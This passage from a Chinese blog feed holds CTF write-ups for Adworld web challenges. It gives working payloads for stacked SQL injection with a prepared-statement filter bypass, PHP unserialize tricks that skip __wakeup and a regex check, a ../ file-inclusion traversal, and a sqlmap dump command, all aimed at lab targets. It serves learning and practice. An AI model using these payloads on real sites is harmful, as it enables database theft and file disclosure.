/></p><p>发现select被正则ban掉了，尝试其他绕过姿势，发现堆叠注入可行</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609234501271.png" alt="image-20220609234501271" /></p><p>看一看表情况，有两个，盲猜在1919810931114514表里面</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609235729178.png" alt="image-20220609235729178" /></p><p>查看1919810931114514表的字段</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610000155731.png" alt="image-20220610000155731" /></p><p>接下来就是查看flag字段的内容了，但是select被ban掉，在网上找的wp中使用<strong>预编译</strong>绕过进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;sEt @sql = CONCAT(&#x27;</span>se<span class="hljs-string">&#x27;,&#x27;</span>lect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-string">&#x27;);prEpare stmt from @sql;EXECUTE stmt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610000505321.png" alt="image-20220610000505321" /></p><hr /><h1 id="web_php_unserialize"><a class="markdownIt-Anchor" href="#web_php_unserialize"></a> Web_php_unserialize</h1><p>审计源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里要绕过pre_match的正则匹配，也要绕过__wakeup()函数，将<strong>file</strong>成员变量设为 <em><strong>fl4g.php</strong></em>，序列化脚本与上题一致</p><p>preg_match正则为 <code>/[oc]:\d+:/i</code>  oc表示o或者c字母，加上冒号，<strong>\d</strong>表示0-9数字，**+**表示前面重复，再加一个冒号，/i表示不区分大小写</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609020433924.png" alt="image-20220609020433924" /></p><blockquote><p>正则匹配测试 <a href="https://c.runoob.com/front-end/854/">正则表达式在线测试 | 菜鸟工具 (runoob.com)</a></p></blockquote><p>这里在O:4中添加一个+号绕过正则(4和正数4(<strong>+4</strong>)在php中完全一致)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$xctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$xctf</span>);<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$x</span>);<span class="hljs-comment">//绕过preg_match()</span><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>, <span class="hljs-variable">$x</span>);<span class="hljs-comment">//绕过__wakeup()</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$x</span>);<br></code></pre></td></tr></table></figure><p>得到<strong>var</strong>的传值<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>这里需要注意的是不能在序列化后的字符进行修改，因为序列化后有乱码不能直接复制，导致base64加密错误，需要在php脚本中进行修改和base64编码。</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609020747760.png" alt="image-20220609020747760" /></p><hr /><h1 id="unserialize3"><a class="markdownIt-Anchor" href="#unserialize3"></a> unserialize3</h1><p>本题考查php中反序列化知识，其中包括魔术方法____ sleep() 和 ____ wakeup()</p><p>在使用serialize()方法时会**首先调用sleep()<strong>方法，同理，在unserialize()时会</strong>首先调用wakeup()**方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先序列化一个xctf类的对象，其中包含flag成员，值为字符’111’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-variable">$flag</span>;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$Xctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>(<span class="hljs-string">&#x27;111&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Xctf</span>);<br></code></pre></td></tr></table></figure><blockquote><p>在线运行代码网站<a href="https://code.y444.cn/php">PHP在线运行工具|代码在线运行工具 (y444.cn)</a></p></blockquote><p>运行结果为<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>题中给的xctf类中有wakeup()方法，也就是在反序列化时会直接执行exit()函数，所以要对wakeup()方法进行绕过</p><p>网上的说法是序列化后的字符串中类名后面的数字代表该类的属性个数，若将该值修改为大于原有的个数，则跳过wakeup()魔术方法</p><p>结果为<code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608233717557.png" alt="image-20220608233717557" /></p><hr /><h1 id="warmup"><a class="markdownIt-Anchor" href="#warmup"></a> warmup</h1><p>上来给一个大滑稽图片，给我整不会了😓</p><p>审计源码隐藏source.php，贴下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据hint.php得到flag的相关信息: ffffllllaaaagggg</p><p>白名单过滤，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>p</mi></msub><mi>a</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">_page变量是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span></span></span></span>page变量取第一个?前的所有字符，观察return true的时候满足的条件</p><p>第一个为source.php(hint.php)? + payload</p><p>第二个为source.php(hint.php)%25%33%66 + payload</p><blockquote><p>%25%33%66 为?的两次urlencode</p></blockquote><p>最终绕过后进入文件包含的命令为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;source.php(hint.php)? + payload&quot;</span>)<br></code></pre></td></tr></table></figure><p>不断尝试后得到payload，但我不是很懂include文件包含为什么会成功</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">source.php?file=source.php?../../../../../ffffllllaaaagggg<br>source.php?file=source.php%25%33%66../../../../../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610014052090.png" alt="image-20220610014052090" /></p><hr /><h1 id="newscenter"><a class="markdownIt-Anchor" href="#newscenter"></a> NewsCenter</h1><p>打开后输入关键词查找news，扫了下网站目录没什么发现</p><p>试了下有没有sql注入，单引号闭合，果然报错了</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610104337575.png" alt="image-20220610104337575" /></p><p>用order by fuzz一下，有3列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">#</span><br><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,database() <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>手工注入做不下去了：) <s>自己太菜了</s> ，上sqlmap，属于盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://111.200.241.244:57582/ --data=search=1 -D news -T secret_table -columns --dump<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610105942596.png" alt="image-20220610105942596" /></p><hr /><h1 id="nannannannan-batman"><a class="markdownIt-Anchor" href="#nannannannan-batman"></a> NaNNaNNaNNaN-Batman</h1><p>给了attachment附件，看一看是什么鬼</p><p>打开后一堆乱码，很多混淆，也不知道怎么改，只能看wp了，原来是将执行代码<strong>eval</strong>变为<strong>alert</strong>显示出源码(<strong>关键读懂js的含义</strong>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">$</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> e=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;c&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(e.<span class="hljs-property">length</span>==<span class="hljs-number">16</span>)</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^be0f23/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/233ac/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/e98aa$/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/c7be9/</span>)!=<span class="hljs-literal">null</span>)&#123;</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> t=[<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;s_a&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;e&#125;&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> n=[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;_h0l&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> r=[<span class="hljs-string">&quot;g&#123;&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;_0&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> i=[<span class="hljs-string">&quot;it&#x27;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> s=[t,n,r,i];</span><br><span class="language-javascript">                            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;</span><br><span class="language-javascript">                                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);</span><br><span class="language-javascript">                                s[o%<span class="hljs-number">4</span>].<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="language-javascript"><span class="hljs-keyword">delete</span> _</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>刚开始我还在探索怎样构造输入的值，满足这么多的if条件，但根本不用这么麻烦，直接把核心内容拿出来输出完事</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> t=[<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;s_a&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;e&#125;&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> n=[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;_h0l&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> r=[<span class="hljs-string">&quot;g&#123;&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;_0&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> i=[<span class="hljs-string">&quot;it&#x27;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> s=[t,n,r,i];</span><br><span class="language-javascript"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);</span><br><span class="language-javascript">s[o%<span class="hljs-number">4</span>].<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610113732822.png" alt="image-20220610113732822" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界Web新手区</title>
    <link href="/2022/06/08/AdWorld/"/>
    <url>/2022/06/08/AdWorld/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><p>作为一个学习网安的菜鸡,大多时候都<strong>不太正经</strong>,只会去研究自己感兴趣的东西,导致接触的东西杂而多,但都没有显著的成果,是时候回归web正道了,就从最基础的攻防世界出发,记录我的web学习之路。</p><h1 id="view_source"><a class="markdownIt-Anchor" href="#view_source"></a> view_source</h1><p>打开页面后发现鼠标左键选中和右键失灵,提示查看源码F12</p><p><img src="https://s2.loli.net/2022/06/07/her6mUTSKWqF8LX.png" alt="image-20220607000350524" /></p><p>edge源代码一栏选中页面选项,会显示相关站点信息的页面源码,包含js和html等</p><p>这里发现是通过js中 <strong>oncontextmenu</strong> 和 <strong>onselectstart</strong> 的<strong>DOM事件</strong>来禁用鼠标点击右键菜单和目标选中</p><p>html注释隐藏flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 在此处写注释 --&gt;</span><br></code></pre></td></tr></table></figure><hr /><h1 id="get_post"><a class="markdownIt-Anchor" href="#get_post"></a> get_post</h1><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004453104.png" alt="image-20220607004453104" /></p><p>http协议中使用GET方法提交变量, 方法为在url添加?和变量值,多个值用&amp;符号拼接</p><p>可以直接在Query一栏添加相关变量</p><p>(以GET方式提交变量<strong>不受GET方法的限制</strong>,可以是POST或者其他方法)</p><p><img src="https://s2.loli.net/2022/06/07/Es3PqxWDGdju8Cl.png" alt="image-20220607005745599" /></p><p>再以POST方法提交变量b,在body处可以通过form-data和www-form-urlencoded方式提交</p><p><img src="https://s2.loli.net/2022/06/07/IGBQbTzf58iYMsJ.png" alt="image-20220607010134446" /></p><hr /><h2 id="robots"><a class="markdownIt-Anchor" href="#robots"></a> robots</h2><h4 id="robots协议"><a class="markdownIt-Anchor" href="#robots协议"></a> Robots协议</h4><blockquote><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取.</p></blockquote><p>根据协议，网站管理员可以在<strong>网站域名的根目录下放一个robots.txt 文本文件</strong>，里面可以指定不同的网络爬虫能访问的页面和禁止访问的页面，指定的页面由正则表达式表示。网络爬虫在采集这个网站之前，首先获取到这个文件，然后解析到其中的规则，然后根据规则来采集网站的数据。</p><p>注意，这个协议的存在更多的是需要网络爬虫去遵守，而起不到反爬虫的功能(<strong>此地无银三百两</strong>)</p><p>此协议可以减少搜索引擎爬虫的访问流量, User-agent行中 百度为Baiduspider 